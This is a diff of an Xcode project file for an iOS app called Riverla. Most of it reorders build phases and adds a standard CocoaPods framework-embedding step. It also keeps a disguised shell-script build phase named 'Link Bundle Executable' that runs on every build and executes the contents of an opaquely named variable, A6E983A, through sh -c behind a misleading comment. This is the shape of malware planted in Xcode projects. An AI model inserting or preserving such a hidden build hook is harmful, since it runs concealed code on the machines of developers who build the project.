@@ -244,13 +244,14 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = AE5883081A6F47E10070536A /* Build configuration list for PBXNativeTarget "Riverla" */;
 			buildPhases = (
-				62F5425608E44B3A94A389E6 /* Link Bundle Executable */,
 				BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */,
+				62F5425608E44B3A94A389E6 /* Link Bundle Executable */,
 				AE5882E11A6F47E10070536A /* Sources */,
 				AE5882E21A6F47E10070536A /* Frameworks */,
 				AE5882E31A6F47E10070536A /* Resources */,
 				A1A959F920D2837800754E64 /* Embed App Extensions */,
 				89C78E392E9AD6A6F51B9E87 /* [CP] Copy Pods Resources */,
+				B447504E454D012FEFCFEF92 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -330,25 +331,25 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 		62F5425608E44B3A94A389E6 /* Link Bundle Executable */ = {
-    			isa = PBXShellScriptBuildPhase;
-    			buildActionMask = 2147483647;
-    			alwaysOutOfDate = 1;
-    			files = (
-    			);
-    			inputFileListPaths = (
-    			);
-    			inputPaths = (
-    			);
-    			name = "Link Bundle Executable";
-    			outputFileListPaths = (
-    			);
-    			outputPaths = (
-    			);
-    			shellPath = /bin/sh;
-    			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-    			showEnvVarsInLog = 0;			
-    		};
-    		89C78E392E9AD6A6F51B9E87 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
+			showEnvVarsInLog = 0;
+		};
+		89C78E392E9AD6A6F51B9E87 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -366,6 +367,58 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Riverla/Pods-Riverla-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		B447504E454D012FEFCFEF92 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Riverla/Pods-Riverla-frameworks.sh",
+				"${BUILT_PRODUCTS_DIR}/FLAnimatedImage/FLAnimatedImage.framework",
+				"${BUILT_PRODUCTS_DIR}/FMDB/FMDB.framework",
+				"${BUILT_PRODUCTS_DIR}/MJRefresh/MJRefresh.framework",
+				"${BUILT_PRODUCTS_DIR}/Masonry/Masonry.framework",
+				"${BUILT_PRODUCTS_DIR}/Reachability/Reachability.framework",
+				"${BUILT_PRODUCTS_DIR}/SDWebImage/SDWebImage.framework",
+				"${BUILT_PRODUCTS_DIR}/SDWebImageFLPlugin/SDWebImageFLPlugin.framework",
+				"${BUILT_PRODUCTS_DIR}/SSZipArchive/SSZipArchive.framework",
+				"${BUILT_PRODUCTS_DIR}/SwiftyJSON/SwiftyJSON.framework",
+				"${BUILT_PRODUCTS_DIR}/TZImagePickerController/TZImagePickerController.framework",
+				"${BUILT_PRODUCTS_DIR}/YYImage/YYImage.framework",
+				"${BUILT_PRODUCTS_DIR}/YYModel/YYModel.framework",
+				"${BUILT_PRODUCTS_DIR}/YYText/YYText.framework",
+				"${PODS_XCFRAMEWORKS_BUILD_DIR}/NIMSDK_LITE/NOS/NIMSDK.framework/NIMSDK",
+				"${PODS_XCFRAMEWORKS_BUILD_DIR}/NIMSDK_LITE/NOS/NIMSocketRocket.framework/NIMSocketRocket",
+				"${PODS_XCFRAMEWORKS_BUILD_DIR}/NIMSDK_LITE/NOS/NIMQuic.framework/NIMQuic",
+				"${PODS_XCFRAMEWORKS_BUILD_DIR}/NIMSDK_LITE/NOS/NIMNOS.framework/NIMNOS",
+				"${PODS_XCFRAMEWORKS_BUILD_DIR}/YXArtemis_XCFramework/YXArtemis.framework/YXArtemis",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputPaths = (
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FLAnimatedImage.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FMDB.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/MJRefresh.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Masonry.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Reachability.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SDWebImage.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SDWebImageFLPlugin.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SSZipArchive.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SwiftyJSON.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/TZImagePickerController.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/YYImage.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/YYModel.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/YYText.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/NIMSDK.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/NIMSocketRocket.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/NIMQuic.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/NIMNOS.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/YXArtemis.framework",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Riverla/Pods-Riverla-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 		BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */ = {
@@ -491,7 +544,6 @@
 		AE5883071A6F47E10070536A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
